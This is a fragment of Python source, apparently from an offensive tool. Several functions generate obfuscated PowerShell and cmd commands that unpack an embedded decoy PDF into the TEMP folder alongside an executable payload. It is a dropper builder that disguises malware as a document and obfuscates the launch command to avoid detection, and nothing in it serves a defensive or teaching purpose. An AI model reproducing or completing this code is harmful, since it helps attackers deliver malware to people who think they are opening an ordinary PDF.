...
def obfuscate_powershell_command_optimized(payloadname, output_exe_filename, szPayload, pdf_size=None, pdf_filename=None):
    ...
    if pdf_size and pdf_filename:
        file_cmd_parts.extend([
            # Find PDF marker (0x50 0x44 0x46 0x2D = "PDF-")
            f'${pdf_var}=-1;for($i=0;$i -lt (${bytes_var}.Length-3);$i++){{if(${bytes_var}[$i] -eq 80 -and ${bytes_var}[$i+1] -eq 68 -and ${bytes_var}[$i+2] -eq 70 -and ${bytes_var}[$i+3] -eq 45){{${pdf_var}=$i;break}}}};',
            f'if(${pdf_var} -ne -1){{',
...
def obfuscate_powershell_command(payloadname, output_exe_filename, szPayload, pdf_size=None, pdf_filename=None):
    ...
    if pdf_size and pdf_filename:
        file_cmd_parts.extend([
            # Find PDF marker (0x50 0x44 0x46 0x2D = "PDF-")
            f'${pdf_var}=(0..(${bytes_var}.Length-4)|Where-Object{{${bytes_var}[$_] -eq 0x50 -and ${bytes_var}[$_+1] -eq 0x44 -and ${bytes_var}[$_+2] -eq 0x46 -and ${bytes_var}[$_+3] -eq 0x2D}})[0];',
            f'if(${pdf_var}){{',
            f'${pdf_out_var}=\\"$Env:TEMP\\\\{pdf_filename}\\";',
...
def obfuscate_cmd_wrapper(payloadname, output_exe_filename, szPayload, pdf_size=None, pdf_filename=None):
    ...
    if pdf_size and pdf_filename:
        ps_parts.extend([
            f"$pdfPos=-1;for($i=0;$i -lt ($b.Length-3);$i++){{if($b[$i] -eq 80 -and $b[$i+1] -eq 68 -and $b[$i+2] -eq 70 -and $b[$i+3] -eq 45){{$pdfPos=$i;break}}}};",
            f"if($pdfPos -ne -1){{",
...
def obfuscate_with_string_manipulation(payloadname, output_exe_filename, szPayload, pdf_size=None, pdf_filename=None):
    ...
    if pdf_size and pdf_filename:
        cmd_parts.extend([
            f'${{8}}=-1;for($i=0;$i -lt (${{2}}.Length-3);$i++){{if(${{2}}[$i] -eq 80 -and ${{2}}[$i+1] -eq 68 -and ${{2}}[$i+2] -eq 70 -and ${{2}}[$i+3] -eq 45){{${{8}}=$i;break}}}};',
            f'if(${{8}} -ne -1){{',
